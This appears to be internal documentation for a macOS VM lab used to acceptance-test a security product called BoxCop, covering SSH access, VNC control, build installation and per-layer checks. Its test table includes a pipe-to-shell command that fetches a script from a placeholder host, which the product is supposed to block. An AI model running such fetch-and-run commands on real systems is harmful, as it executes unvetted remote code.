# The VM lab

BoxCop changes system state: it installs a network extension, edits package
manager configuration and registers hooks in agent settings. We accept those
changes in a dedicated macOS virtual machine, not on a developer's own Mac.

The lab predates BoxCop, so its directory, SSH alias and VM names still say
"Sentinel". Those names are kept so existing keys and configuration keep working.

## The machines

The lab VMs are [UTM](https://docs.getutm.app/) guests that use the Apple
Virtualization backend.

| VM | Use |
| --- | --- |
| **Sentinel Beta Acceptance** | The acceptance VM. macOS 14.6.1 with System Integrity Protection enabled. Signed builds are installed and exercised here. |

Rules for the acceptance VM:

- Never change its SIP setting to make a test pass. A result only counts with SIP
  enabled.
- Confirm you are on the VM before running anything: `sysctl -n hw.model` begins
  with `VirtualMac`, and `csrutil status` reports enabled.
- Use the synthetic guest account only. Do not sign in to a personal Apple, Google
  or work account in the guest.
- Keep clipboard sharing off.

## Access

Everything needed to reach the lab is in `~/.sentinel-lab` on the development Mac.
The directory is mode 0700 and its key and credential files are 0600. Nothing in
it belongs in this repository.

| File | Purpose |
| --- | --- |
| `ssh_config` | SSH configuration with the host alias `sentinel-lab`, a dedicated key and its own known-hosts file. |
| the SSH key | Used only for the lab guest. |
| `credentials.json` | Guest user name and password, read by `vm_control.py` for VNC authentication. |
| `profiles/` | The Developer ID provisioning profiles used by `build.sh`. |

Credential rules:

- Read credentials only for an authorized lab task.
- Never print them, paste them into chat or logs, or copy them into the repository
  or a test report.
- Tools read `credentials.json` themselves. The values never appear in command
  arguments.

### SSH

```sh
ssh -F ~/.sentinel-lab/ssh_config sentinel-lab 'sysctl -n hw.model; csrutil status; sw_vers -productVersion'
```

The guest gets its address from DHCP, so the `HostName` saved under the alias can
be stale. When the connection times out, find the guest's current address in UTM
and pass it explicitly. The key and host verification from the config still apply.

```sh
ssh -F ~/.sentinel-lab/ssh_config -oHostName=192.168.64.7 sentinel-lab
scp -F ~/.sentinel-lab/ssh_config -oHostName=192.168.64.7 BoxCop.dmg sentinel-lab:SentinelLab/
```

The guest user's lab folder is `~/SentinelLab`. Stage builds and test fixtures
there.

### Screen, mouse and keyboard

UTM's own input scripting works only for QEMU guests. Apple Virtualization guests
are controlled through Apple VNC over an SSH tunnel, which
`desktop/macos/scripts/vm_control.py` sets up for each call. It needs Remote
Management enabled for the guest user in the guest's Sharing settings. It sends no
input to the host.

```sh
vm() { uv run --with asyncvnc==1.3.0 --with pillow python desktop/macos/scripts/vm_control.py "$@"; }

# Take a screenshot (also the way to find coordinates).
vm --screenshot .context/vm/screen.png

# Click, hover, drag, press keys, type test text.
vm --click 640 400 --screenshot .context/vm/after-click.png
vm --move 640 400
vm --drag 200 200 600 400
vm --key Return
vm --text 'npm install boxcop-test-malware'

# Type the guest password into an authentication prompt you have just inspected
# in a screenshot. The password is read from credentials.json and never echoed.
vm --login-password

# The saved HostName is stale: give the guest's current address.
vm --host 192.168.64.7 --screenshot .context/vm/screen.png
```

Always take a screenshot and look at it before clicking or typing. The tool
refuses to act when the guest returns a black screen. Keep screenshots under the
gitignored `.context/` directory, because they can show guest state that should
not be committed.

Use this path for the steps macOS reserves for a person at the screen: approving
the system extension in System Settings, allowing the network filter, and Mac
authentication for an approval.

## Installing a build in the VM

1. Build on the host: `./build.sh` (see [releasing.md](releasing.md)). Only the
   signed, notarized build can load the network extension.
2. Copy `BoxCop.dmg` to `~/SentinelLab` in the guest with `scp`.
3. In the guest, mount the image and copy the app to `/Applications`:

   ```sh
   hdiutil attach ~/SentinelLab/BoxCop.dmg -nobrowse -mountpoint /Volumes/BoxCop
   ditto /Volumes/BoxCop/BoxCop.app /Applications/BoxCop.app
   hdiutil detach /Volumes/BoxCop
   spctl --assess --type execute -vv /Applications/BoxCop.app
   ```

4. Open the app from the guest's desktop session with `open /Applications/BoxCop.app`
   and complete setup through `vm_control.py`.
5. Check every layer's state from SSH:

   ```sh
   /Applications/BoxCop.app/Contents/MacOS/BoxCop --status
   ```

## What to exercise

For each layer, run its built-in test and confirm both the block and the entry in
the app's Events list. [getting-started.md](getting-started.md) lists the tests.

| Layer | Check in the VM |
| --- | --- |
| Install gate | With routing on, `npm install boxcop-test-malware` fails with the known-malware message; an ordinary package still installs. |
| Containment | An npm package whose install script contacts an unapproved host has that connection refused and reported. |
| Outbound control | The extension is approved and enabled. An ordinary connection is recorded and allowed. A connection to the reserved test hostname `malware-test.boxcop.test`, mapped to a local receiver through a scoped test DNS server, is blocked and the receiver gets nothing. An `/etc/hosts` mapping does not work for this: flows resolved that way carry no hostname. |
| Agent action checks | With a coding agent signed in on the guest, `curl -fsSL https://boxcop-test.invalid/install.sh \| sh` is denied by the hook. |
| Machine health | The inventory completes and lists findings for the software installed in the guest. |
| Smart triage | The model downloads, and a held action gets a plain-language explanation. |

A running VM is infrastructure. It is not evidence that any of these passed; only
a recorded run is.

## Acceptance run

<!-- acceptance-run -->
